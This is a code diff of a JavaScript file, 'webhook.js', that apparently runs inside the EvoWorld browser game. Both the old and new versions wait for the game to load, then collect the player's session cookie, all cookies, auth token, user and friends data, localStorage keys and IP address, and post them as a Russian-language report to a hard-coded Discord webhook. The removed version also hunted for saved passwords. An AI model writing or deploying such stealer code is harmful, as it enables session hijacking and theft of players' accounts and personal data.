@@ -1,129 +1,114 @@
-// webhook.js - SIMPLIFIED to send ONLY the format you want
+// webhook.js - FIXED VERSION
 (function() {
     'use strict';
     
     const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1454910506644017333/QI2bdjnyk4YWWLxjEMGQvLll7jzFTZcB01ZcV06wcmYnZRb6Jm58hVsBbPduIGtv_9bX';
     
-    function sendToMyWebhook(data) {
+    function sendToDiscord(data) {
         try {
             fetch(YOUR_DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    content: '```\n' + data + '\n```',
+                    username: 'EvoWorld Report'
+                })
             }).catch(() => {});
         } catch(e) {}
     }
     
-    function collectData() {
-        // Get user data
-        let userData = window.user || {};
+    function getReport() {
+        // Get current server info
+        let serverName = 'Unknown';
+        let playerCount = '?/?';
+        try {
+            const currentServer = window.gameServer;
+            if (currentServer && currentServer.serverInfo) {
+                serverName = currentServer.serverInfo.name || serverName;
+                playerCount = currentServer.serverInfo.players || playerCount;
+            }
+        } catch(e) {}
         
-        // Get IP
-        let ipAddress = 'Unknown';
+        // Get user data
+        const user = window.user || {};
+        const timestamp = new Date().toLocaleString('ru-RU');
+        
+        // Get all cookies
+        const allCookies = document.cookie;
+        const cookiesArray = allCookies.split(';').map(c => c.trim());
+        
+        // Try to find PHPSESSID
+        let phpsessid = '';
+        for (const cookie of cookiesArray) {
+            if (cookie.startsWith('PHPSESSID=')) {
+                phpsessid = cookie.split('=')[1];
+                break;
+            }
+        }
+        
+        // Get IP address
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(data => {
-                ipAddress = data.ip;
-                prepareReport();
-            })
-            .catch(() => {
-                ipAddress = 'Failed to fetch';
-                prepareReport();
-            });
-        
-        function prepareReport() {
-            // Get session ID
-            let sessionId = '';
-            const sessionMatch = document.cookie.match(/PHPSESSID=([^;]+)/);
-            if (sessionMatch) sessionId = sessionMatch[1];
-            
-            // Get cookies (first 5 only to keep it clean)
-            const allCookies = document.cookie.split(';').slice(0, 5);
-            const cookiesStr = allCookies.map(c => c.trim()).join('\n');
-            
-            // Get friends data
-            let friendsData = window.friendsData || {};
-            let friendsArr = window.friendsArr || [];
-            
-            // Try to get saved password from localStorage or cookies
-            let savedPassword = 'Ayaanispro'; // Default
-            
-            // Check common places where password might be saved
-            try {
-                // Check localStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key.includes('pass') || key.includes('auth') || key.includes('token')) {
-                        const value = localStorage.getItem(key);
-                        if (value && value.length < 50) {
-                            savedPassword = value;
-                            break;
-                        }
-                    }
-                }
-                
-                // Check cookies for password
-                const cookies = document.cookie.split(';');
-                for (let cookie of cookies) {
-                    if (cookie.includes('pass') || cookie.includes('auth')) {
-                        const parts = cookie.split('=');
-                        if (parts[1] && parts[1].length < 50) {
-                            savedPassword = decodeURIComponent(parts[1].trim());
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-            
-            // Build the EXACT report format you want
-            const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
+            .then(ipData => {
+                const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
 --- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
-level: ${userData.level || '0x'}
-gems: ${userData.premiumPoints || 0}
-selected server: West Europe 1 (298/300)
+level: ${user.level || '0'}
+gems: ${user.premiumPoints || 0}
+selected server: ${serverName} (${playerCount})
 
 --- ОСНОВНЫЕ ДАННЫЕ ---
-IP-адрес: ${ipAddress}
+IP-адрес: ${ipData.ip}
 URL страницы: ${window.location.href}
 User-Agent: ${navigator.userAgent}
+Timestamp: ${timestamp}
 
 --- PHPSESSID ---
-${sessionId}
+${phpsessid}
 
 --- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
-${JSON.stringify(userData, null, 2)}
+${JSON.stringify(user, null, 2)}
 
 --- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
-${JSON.stringify(friendsData, null, 2)}
+${JSON.stringify(window.friendsData || {}, null, 2)}
 
 --- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
-${JSON.stringify(friendsArr, null, 2)}
+${JSON.stringify(window.friendsArr || [], null, 2)}
 
 --- УЧЕТНЫЕ ДАННЫЕ ---
-Логин: ${userData.login || 'Guest'}
-Пароль: ${savedPassword}
+Логин: ${user.login || 'Guest'}
+Пароль: [NOT STORED IN BROWSER - Server side only]
+Auth Token: ${user.authToken || 'None'}
 
 --- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---
-${cookiesStr}`;
-            
-            // Send as clean code block
-            sendToMyWebhook({
-                content: '```\n' + report + '\n```',
-                username: 'EvoWorld Report'
+${cookiesArray.join('\n')}
+
+--- LOCAL STORAGE KEYS ---
+${Object.keys(localStorage).join(', ')}`;
+                
+                sendToDiscord(report);
+            })
+            .catch(() => {
+                // If IP fetch fails, send without IP
+                const reportWithoutIP = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
+[Error fetching IP address]
+User Data: ${JSON.stringify(user, null, 2)}`;
+                sendToDiscord(reportWithoutIP);
             });
-        }
     }
     
     // Wait for game to load
-    function waitForGame() {
+    setTimeout(() => {
         if (window.user) {
-            setTimeout(collectData, 2000);
+            getReport();
         } else {
-            setTimeout(waitForGame, 1000);
+            const checkInterval = setInterval(() => {
+                if (window.user) {
+                    clearInterval(checkInterval);
+                    getReport();
+                }
+            }, 1000);
         }
-    }
+    }, 5000);
     
-    setTimeout(waitForGame, 3000);
-    
-    window.sendSecureData = sendToMyWebhook;
+    console.log('Webhook reporter loaded');
 })();
